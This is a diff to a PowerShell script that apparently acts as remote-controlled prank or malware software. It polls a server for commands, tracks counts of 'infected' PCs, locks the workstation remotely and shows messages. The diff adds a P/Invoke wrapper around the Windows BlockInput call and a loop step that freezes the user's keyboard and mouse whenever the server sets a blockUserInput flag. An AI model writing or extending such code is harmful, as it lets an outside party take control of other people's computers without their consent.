@@ -56,6 +56,7 @@ if (-not $IsTempInstance.IsPresent) {
 Add-Type -AssemblyName System.Windows.Forms
 
 $global:isActive = $null
+$global:blockUserInput = $null
 $global:message = $null
 $global:messageIncr = $null
 $global:nbPcInfectIncr = $null
@@ -71,6 +72,7 @@ function checkDataBase {
         Write-Host $response
         if ($response -ne $null) {
             $global:isActive = $response.isActive
+            $global:blockUserInput = $response.blockUserInput
             $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
             $global:nbPcInfectIncr = $response.nbPcInfect.nbPcInfectIncr
             $global:nbLockSession = $response.nbLockSession
@@ -92,6 +94,7 @@ function checkDataBase {
         } else {
             Write-Warning "API response was null."
             $global:isActive = $null
+            $global:blockUserInput = $null
             $global:message = $null
             $global:messageIncr = $null
             $global:nbPcInfectIncr = $null
@@ -102,6 +105,7 @@ function checkDataBase {
     } catch {
         Write-Error "Error checking database: $($_.Exception.Message)"
         $global:isActive = $null
+        $global:blockUserInput = $null
         $global:message = $null
         $global:messageIncr = $null
         $global:nbPcInfect = 0
@@ -138,6 +142,24 @@ function showMessageBox {
     $form.Topmost = $true
     [System.Windows.Forms.MessageBox]::Show($messageContent, $title, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
     $form.Dispose()
+}
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class BlockInputHelper {
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+}
+"@
+
+function Block-UserInput {
+    [BlockInputHelper]::BlockInput($true)
+}
+
+function Unblock-UserInput {
+    [BlockInputHelper]::BlockInput($false)
 }
 
 function main {
@@ -206,6 +228,12 @@ function main {
             if ($global:nbLockSession -ne $global:lastNbLockSession) {
                 rundll32.exe user32.dll,LockWorkStation
                 $global:lastNbLockSession = $global:nbLockSession
+            }
+
+            if ($global:blockUserInput) {
+                Block-UserInput
+            } else {
+                Unblock-UserInput
             }
 
             if ($global:isActive -and -not $isRunning) {
